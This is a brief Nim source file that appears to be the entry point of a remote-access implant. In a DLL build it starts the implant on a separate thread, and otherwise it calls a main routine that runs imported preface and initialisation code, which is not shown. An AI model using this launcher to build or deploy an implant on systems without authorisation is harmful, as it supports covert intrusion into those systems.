import custom
import routine/start

when defined(dllsafe):
  proc implantStart(lp: pointer): culong {.stdcall.} =
    # Thread entry that runs the preface and starts the implant
    custom.preface()
    start.main_init()
    return 0
  # 2 MB stack size
  discard start.CreateThread(nil, cast[pointer](0x200000), cast[pointer](implantStart), nil, 0.culong, nil)
else:
  proc main(): void =
    # Runs the preface and starts the implant
    custom.preface()
    start.main_init()
  main()
